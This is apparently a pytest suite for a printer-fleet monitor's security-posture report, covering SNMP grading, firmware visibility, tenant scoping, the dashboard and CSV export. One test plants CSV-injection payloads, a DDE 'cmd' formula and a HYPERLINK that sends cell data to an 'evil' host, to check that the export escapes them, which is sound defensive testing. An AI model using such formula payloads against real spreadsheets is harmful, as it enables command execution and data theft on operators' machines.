"""Device security-posture reporting: insecure-SNMP flagging, firmware capture,
tenant scoping, fleet summary, and the operator-facing dashboard view."""

from __future__ import annotations

import csv
import io

from fastapi.testclient import TestClient
from sqlalchemy import select

from central import models as m
from central import queries
from central.main import app
from central.security import hash_password
from printer_nanny_agent.poller import build_reading, parse_firmware
from printer_nanny_agent import oids


# --------------------------------------------------------------------------- #
# Fixtures
# --------------------------------------------------------------------------- #
def _seed_two_clients(db):
    """Acme on cleartext v2c, Beta on SNMPv3 USM. Each gets one subnet whose
    CIDR contains its printers' IPs, so the rollup resolves the SNMP version
    from the subnet config (the anchor signal)."""
    acme = m.Client(name="Acme")
    beta = m.Client(name="Beta")
    db.add_all([acme, beta])
    db.flush()
    acme_hq = m.Site(client_id=acme.id, name="HQ")
    beta_hq = m.Site(client_id=beta.id, name="HQ")
    db.add_all([acme_hq, beta_hq])
    db.flush()

    # Subnets carry the SNMP creds. Acme = v2c cleartext with a NON-default
    # community (so the cleartext finding is tested apart from the
    # default-community one); Beta = v3 authPriv, the only fully secure grade.
    db.add(m.Subnet(site_id=acme_hq.id, cidr="10.0.0.0/24", label="Acme LAN",
                    snmp_version="2c", snmp_community="s3cret"))
    db.add(m.Subnet(site_id=beta_hq.id, cidr="10.0.1.0/24", label="Beta LAN",
                    snmp_version="3",
                    snmp_v3={"user": "fleetmon", "security_level": "authPriv"}))

    # Acme: two approved printers in the v2c subnet; one has firmware, one None.
    a1 = m.Printer(
        client_id=acme.id, site_id=acme_hq.id, ip="10.0.0.10",
        brand="HP", model="M404", firmware="FW3.21",
        snmp_version="2c", status=m.PrinterStatus.ok,
        discovery_state=m.DiscoveryState.approved,
    )
    a2 = m.Printer(
        client_id=acme.id, site_id=acme_hq.id, ip="10.0.0.11",
        brand="Brother", model="MFC", firmware=None,
        snmp_version="2c", status=m.PrinterStatus.ok,
        discovery_state=m.DiscoveryState.approved,
    )
    # Beta: one approved printer in the v3 subnet, plus a pending one (excluded).
    b1 = m.Printer(
        client_id=beta.id, site_id=beta_hq.id, ip="10.0.1.10",
        brand="Xerox", model="C405", firmware="1.5.7",
        snmp_version="3", status=m.PrinterStatus.ok,
        discovery_state=m.DiscoveryState.approved,
    )
    b_pending = m.Printer(
        client_id=beta.id, site_id=beta_hq.id, ip="10.0.1.99",
        snmp_version="3", status=m.PrinterStatus.unknown,
        discovery_state=m.DiscoveryState.pending,
    )
    db.add_all([a1, a2, b1, b_pending])
    db.commit()
    return acme, beta


def _login_admin(db) -> TestClient:
    db.add(m.User(
        username="admin", password_hash=hash_password("pw"), role=m.UserRole.admin,
    ))
    db.commit()
    cli = TestClient(app)
    cli.post("/login", data={"username": "admin", "password": "pw"},
             follow_redirects=False)
    return cli


# --------------------------------------------------------------------------- #
# Insecure-SNMP flagging (anchor signal)
# --------------------------------------------------------------------------- #
def test_cleartext_snmp_flagged_from_subnet_config(db):
    _seed_two_clients(db)
    rollup = queries.security_posture_rollup(db)
    by_ip = {r["printer"].ip: r for r in rollup["rows"]}

    # v2c subnet -> cleartext transport, flagged.
    assert by_ip["10.0.0.10"]["snmp_version"] == "2c"
    assert by_ip["10.0.0.10"]["snmp_grade"] == queries.SNMP_GRADE_CLEARTEXT
    assert by_ip["10.0.0.10"]["snmp_secure"] is False
    assert queries.FLAG_SNMP_CLEARTEXT in by_ip["10.0.0.10"]["flags"]
    assert by_ip["10.0.0.10"]["snmp_source"] == "Acme LAN"
    assert by_ip["10.0.0.11"]["snmp_secure"] is False

    # v3 authPriv -> encrypted, NOT flagged.
    assert by_ip["10.0.1.10"]["snmp_version"] == "3"
    assert by_ip["10.0.1.10"]["snmp_grade"] == queries.SNMP_GRADE_ENCRYPTED
    assert by_ip["10.0.1.10"]["snmp_secure"] is True
    assert by_ip["10.0.1.10"]["flags"] == []

    # Pending device is excluded entirely.
    assert "10.0.1.99" not in by_ip


def test_v3_without_usm_auth_is_not_reported_secure(db):
    """SNMPv3 is a version, not a security property.

    USM's noAuthNoPriv level is v3 with authentication AND privacy switched
    off, and the agent polls at exactly that level when no security_level is
    recorded (agent snmp.py: `(params.v3_security_level or "noAuthNoPriv")`).
    Grading either as "secure" would paint a green badge over an
    unauthenticated cleartext session -- absence reported as safety, which is
    the one thing this report must never do.
    """
    c = m.Client(name="Nominal v3")
    db.add(c)
    db.flush()
    site = m.Site(client_id=c.id, name="HQ")
    db.add(site)
    db.flush()
    # Explicit noAuthNoPriv, and a v3 subnet with no security_level at all.
    db.add(m.Subnet(site_id=site.id, cidr="10.9.0.0/24", label="noauth",
                    snmp_version="3", snmp_v3={"user": "u",
                                               "security_level": "noAuthNoPriv"}))
    db.add(m.Subnet(site_id=site.id, cidr="10.9.1.0/24", label="unset",
                    snmp_version="3", snmp_v3={"user": "u"}))
    # ...and authNoPriv, which is authenticated but still sends data in clear.
    db.add(m.Subnet(site_id=site.id, cidr="10.9.2.0/24", label="authnopriv",
                    snmp_version="3", snmp_v3={"user": "u",
                                               "security_level": "authNoPriv"}))
    for ip in ("10.9.0.5", "10.9.1.5", "10.9.2.5"):
        db.add(m.Printer(
            client_id=c.id, site_id=site.id, ip=ip, snmp_version="3",
            status=m.PrinterStatus.ok, discovery_state=m.DiscoveryState.approved,
        ))
    db.commit()

    by_ip = {r["printer"].ip: r
             for r in queries.security_posture_rollup(db)["rows"]}
    for ip in ("10.9.0.5", "10.9.1.5"):
        assert by_ip[ip]["snmp_grade"] == queries.SNMP_GRADE_CLEARTEXT, ip
        assert by_ip[ip]["snmp_secure"] is False, ip
        assert queries.FLAG_SNMP_CLEARTEXT in by_ip[ip]["flags"], ip
    # authNoPriv is authenticated: a real step up, and not cleartext -- but it
    # is reported as its own grade rather than lumped in with authPriv.
    assert by_ip["10.9.2.5"]["snmp_grade"] == queries.SNMP_GRADE_AUTHENTICATED
    assert by_ip["10.9.2.5"]["snmp_secure"] is True
    assert by_ip["10.9.2.5"]["flags"] == []


def test_default_community_is_its_own_finding(db):
    """A factory community string is a finding we can assert without inferring
    anything about the device -- unlike "v2c is insecure", which cannot
    distinguish a hardened read-only printer from an open one."""
    c = m.Client(name="Defaults")
    db.add(c)
    db.flush()
    site = m.Site(client_id=c.id, name="HQ")
    db.add(site)
    db.flush()
    db.add(m.Subnet(site_id=site.id, cidr="10.5.0.0/24", label="public",
                    snmp_version="2c", snmp_community="public"))
    db.add(m.Subnet(site_id=site.id, cidr="10.5.1.0/24", label="rotated",
                    snmp_version="2c", snmp_community="Rotated-2026"))
    # A v3 subnet that still carries a leftover "public" in the column nothing
    # reads at v3: raising a credential finding there would be crying wolf.
    db.add(m.Subnet(site_id=site.id, cidr="10.5.2.0/24", label="v3",
                    snmp_version="3", snmp_community="public",
                    snmp_v3={"user": "u", "security_level": "authPriv"}))
    for ip in ("10.5.0.5", "10.5.1.5", "10.5.2.5"):
        db.add(m.Printer(
            client_id=c.id, site_id=site.id, ip=ip,
            status=m.PrinterStatus.ok, discovery_state=m.DiscoveryState.approved,
        ))
    db.commit()

    by_ip = {r["printer"].ip: r
             for r in queries.security_posture_rollup(db)["rows"]}
    assert by_ip["10.5.0.5"]["snmp_default_community"] is True
    assert queries.FLAG_SNMP_DEFAULT_COMMUNITY in by_ip["10.5.0.5"]["flags"]
    # Rotated community: still cleartext, but not a credential finding.
    assert by_ip["10.5.1.5"]["snmp_default_community"] is False
    assert by_ip["10.5.1.5"]["flags"] == [queries.FLAG_SNMP_CLEARTEXT]
    # v3 ignores the community column entirely.
    assert by_ip["10.5.2.5"]["snmp_default_community"] is False
    assert by_ip["10.5.2.5"]["flags"] == []


def test_firmware_unknown_surfaced_honestly(db):
    _seed_two_clients(db)
    rollup = queries.security_posture_rollup(db)
    by_ip = {r["printer"].ip: r for r in rollup["rows"]}

    assert by_ip["10.0.0.10"]["firmware"] == "FW3.21"
    assert by_ip["10.0.0.10"]["firmware_known"] is True
    # No firmware -> None, never a fabricated value.
    assert by_ip["10.0.0.11"]["firmware"] is None
    assert by_ip["10.0.0.11"]["firmware_known"] is False


def test_firmware_unknown_is_visibility_not_a_security_finding(db):
    """"We cannot see this" and "this is exposed" are different claims, and
    counting them together is how a security report becomes noise. Firmware
    visibility gets its own column and counter; it never enters `flags`."""
    _seed_two_clients(db)
    rollup = queries.security_posture_rollup(db)
    by_ip = {r["printer"].ip: r for r in rollup["rows"]}

    assert by_ip["10.0.0.11"]["firmware_known"] is False
    assert "firmware-unknown" not in by_ip["10.0.0.11"]["flags"]
    # Its flags are exactly the SNMP finding it genuinely has.
    assert by_ip["10.0.0.11"]["flags"] == [queries.FLAG_SNMP_CLEARTEXT]


def test_snmp_version_falls_back_to_printer_when_no_subnet_matches(db):
    """A printer whose IP sits outside every enrolled CIDR falls back to its
    own snmp_version column instead of silently defaulting to insecure."""
    c = m.Client(name="Orphan")
    db.add(c)
    db.flush()
    site = m.Site(client_id=c.id, name="HQ")
    db.add(site)
    db.flush()
    # Subnet covers 10.0.0.0/24 but the printer is on 192.168.x -> no match.
    db.add(m.Subnet(site_id=site.id, cidr="10.0.0.0/24", snmp_version="2c"))
    p = m.Printer(
        client_id=c.id, site_id=site.id, ip="192.168.50.5",
        snmp_version="3", status=m.PrinterStatus.ok,
        discovery_state=m.DiscoveryState.approved,
    )
    db.add(p)
    db.commit()
    row = queries.security_posture_rollup(db)["rows"][0]
    assert row["snmp_source"] == "printer"
    assert row["snmp_version"] == "3"
    # v3 with no USM config on the printer row either -> noAuthNoPriv, which is
    # what the agent would actually negotiate. Not reported as secure.
    assert row["snmp_grade"] == queries.SNMP_GRADE_CLEARTEXT
    assert row["snmp_secure"] is False


# --------------------------------------------------------------------------- #
# Tenant scoping
# --------------------------------------------------------------------------- #
def test_rollup_scoped_to_client(db):
    acme, beta = _seed_two_clients(db)
    acme_only = queries.security_posture_rollup(db, client_id=acme.id)
    ips = {r["printer"].ip for r in acme_only["rows"]}
    assert ips == {"10.0.0.10", "10.0.0.11"}
    assert acme_only["summary"]["total"] == 2
    assert acme_only["summary"]["snmp_cleartext"] == 2

    beta_only = queries.security_posture_rollup(db, client_id=beta.id)
    ips = {r["printer"].ip for r in beta_only["rows"]}
    assert ips == {"10.0.1.10"}
    assert beta_only["summary"]["snmp_cleartext"] == 0
    assert beta_only["summary"]["snmp_encrypted"] == 1


# --------------------------------------------------------------------------- #
# Fleet summary counts
# --------------------------------------------------------------------------- #
def test_fleet_summary_counts(db):
    _seed_two_clients(db)
    summary = queries.security_posture_rollup(db)["summary"]
    assert summary["total"] == 3            # two Acme + one Beta (pending excluded)
    assert summary["snmp_cleartext"] == 2   # both Acme v2c devices
    assert summary["snmp_encrypted"] == 1   # the Beta v3 authPriv device
    assert summary["snmp_authenticated"] == 0
    # Acme's community is rotated, so cleartext is the only finding there.
    assert summary["snmp_default_community"] == 0
    assert summary["firmware_unknown"] == 1
    assert summary["firmware_known"] == 2
    # Both Acme devices carry the cleartext finding; Beta is clean. The
    # firmware-unknown device is NOT counted twice, and the Beta device is not
    # flagged merely for lacking something.
    assert summary["flagged"] == 2


# --------------------------------------------------------------------------- #
# Dashboard view
# --------------------------------------------------------------------------- #
def test_security_posture_view_renders(db):
    _seed_two_clients(db)
    cli = _login_admin(db)
    resp = cli.get("/security/posture", follow_redirects=False)
    assert resp.status_code == 200
    body = resp.text
    # The posture table header + summary card labels are present.
    assert "Device security posture" in body
    assert "Polled in cleartext" in body
    # The cleartext finding is rendered in the operator's words, not the code.
    assert "cleartext SNMP" in body
    # The known firmware string for the v2c device is rendered.
    assert "FW3.21" in body
    # The honest "unknown" firmware label renders for the device without one.
    assert "unknown" in body
    # ...and the scope note that keeps this from crying wolf is on the page.
    assert "does not assert" in body
    assert "writes" in body


def test_security_posture_view_scopes_to_selected_client(db):
    acme, beta = _seed_two_clients(db)
    cli = _login_admin(db)
    body = cli.get(f"/security/posture?client_id={acme.id}").text
    assert "10.0.0.10" in body or "Acme" in body
    assert "10.0.1.10" not in body
    # A stale/unknown id degrades to the whole fleet rather than erroring.
    resp = cli.get("/security/posture?client_id=999999")
    assert resp.status_code == 200
    assert "10.0.1.10" in resp.text
    # ...as does a non-numeric one.
    assert cli.get("/security/posture?client_id=abc").status_code == 200


def _login_reader(db, client_id) -> TestClient:
    db.add(m.User(
        username="reader", password_hash=hash_password("pw"),
        role=m.UserRole.client_readonly, client_id=client_id,
    ))
    db.commit()
    cli = TestClient(app)
    cli.post("/login", data={"username": "reader", "password": "pw"},
             follow_redirects=False)
    return cli


def test_security_posture_redirects_client_readonly(db):
    acme, _ = _seed_two_clients(db)
    cli = _login_reader(db, acme.id)
    resp = cli.get("/security/posture", follow_redirects=False)
    assert resp.status_code == 303
    assert resp.headers["location"] == "/portal"


# --------------------------------------------------------------------------- #
# CSV export
# --------------------------------------------------------------------------- #
def test_posture_csv_exports_rows_and_honest_unknowns(db):
    _seed_two_clients(db)
    cli = _login_admin(db)
    resp = cli.get("/api/v1/reports/export/posture.csv")
    assert resp.status_code == 200
    assert "text/csv" in resp.headers["content-type"]
    assert "posture" in resp.headers["content-disposition"]

    rows = list(csv.DictReader(io.StringIO(resp.text)))
    by_ip = {r["ip"]: r for r in rows}
    assert set(by_ip) == {"10.0.0.10", "10.0.0.11", "10.0.1.10"}

    assert by_ip["10.0.0.10"]["firmware"] == "FW3.21"
    assert by_ip["10.0.0.10"]["firmware_known"] == "yes"
    assert by_ip["10.0.0.10"]["snmp_grade"] == "cleartext"
    assert by_ip["10.0.0.10"]["flags"] == "snmp-cleartext"
    # Unknown firmware is an empty cell + an explicit "no", never a stand-in
    # value a reader could mistake for a version.
    assert by_ip["10.0.0.11"]["firmware"] == ""
    assert by_ip["10.0.0.11"]["firmware_known"] == "no"
    # The secure device carries no findings.
    assert by_ip["10.0.1.10"]["snmp_grade"] == "encrypted"
    assert by_ip["10.0.1.10"]["flags"] == ""


def test_posture_csv_never_exports_the_community_string(db):
    """The finding is "this is a default"; the value is a live credential and
    this file gets mailed around."""
    _seed_two_clients(db)
    cli = _login_admin(db)
    resp = cli.get("/api/v1/reports/export/posture.csv")
    header = resp.text.splitlines()[0]
    assert "community" in header  # the boolean column
    assert "snmp_default_community" in header
    assert "s3cret" not in resp.text


def test_posture_csv_is_staff_only(db):
    """Every other export pins a client_readonly user to their own client and
    serves the file. This one refuses, because the page it belongs to refuses
    -- an export the UI will not show is a tenancy hole with a filename."""
    acme, _ = _seed_two_clients(db)
    cli = _login_reader(db, acme.id)
    resp = cli.get("/api/v1/reports/export/posture.csv")
    assert resp.status_code == 403
    # Not even their own client's rows leak.
    assert "10.0.0.10" not in resp.text
    resp = cli.get(f"/api/v1/reports/export/posture.csv?client_id={acme.id}")
    assert resp.status_code == 403


def test_posture_csv_scopes_to_client(db):
    acme, beta = _seed_two_clients(db)
    cli = _login_admin(db)
    resp = cli.get(f"/api/v1/reports/export/posture.csv?client_id={beta.id}")
    ips = {r["ip"] for r in csv.DictReader(io.StringIO(resp.text))}
    assert ips == {"10.0.1.10"}


def test_posture_csv_neutralizes_a_formula_from_a_printer(db):
    """Model/firmware strings come off devices on customer LANs. A cell
    starting "=" is a live formula the moment the operator double-clicks the
    export, so it must arrive escaped -- see central/csv_safe.py."""
    acme, _ = _seed_two_clients(db)
    hostile = m.Printer(
        client_id=acme.id,
        site_id=db.scalars(select(m.Site).where(m.Site.client_id == acme.id)).first().id,
        ip="10.0.0.12",
        model='=cmd|\' /C calc\'!A0',
        firmware="=HYPERLINK(\"http://evil/?x=\"&A1,\"click\")",
        snmp_version="2c", status=m.PrinterStatus.ok,
        discovery_state=m.DiscoveryState.approved,
    )
    db.add(hostile)
    db.commit()

    cli = _login_admin(db)
    body = cli.get("/api/v1/reports/export/posture.csv").text
    row = {r["ip"]: r for r in csv.DictReader(io.StringIO(body))}["10.0.0.12"]
    # Escaped with a leading apostrophe, and the payload preserved after it.
    assert row["model"].startswith("'=")
    assert row["firmware"].startswith("'=")
    assert "cmd|" in row["model"]
    # No cell in the whole file begins with a formula trigger.
    for record in csv.reader(io.StringIO(body)):
        for cell in record:
            assert not cell.startswith(("=", "+", "@", "\t", "\r")), cell


# --------------------------------------------------------------------------- #
# Agent-side firmware capture (pure parser)
# --------------------------------------------------------------------------- #
def test_parse_firmware_from_sysdescr_variants():
    assert parse_firmware("HP ETHERNET MULTI-ENVIRONMENT, FW:20230815") == "20230815"
    assert parse_firmware("Brother NC-8300w, Firmware Ver.1.34, Node") == "1.34"
    assert parse_firmware("KYOCERA Printer, Version 2S5_2000.002.052") == "2S5_2000.002.052"
    # Nothing parseable -> None (surfaced honestly as "unknown" downstream).
    assert parse_firmware("Generic SNMP Agent") is None
    assert parse_firmware(None) is None


def test_build_reading_includes_firmware():
    scalars = {oids.SYS_DESCR: "HP LaserJet, FW:50.10.2", oids.SYS_NAME: "lj-1"}
    reading = build_reading("10.0.0.5", scalars, {}, alert_walk={})
    assert reading["firmware"] == "50.10.2"
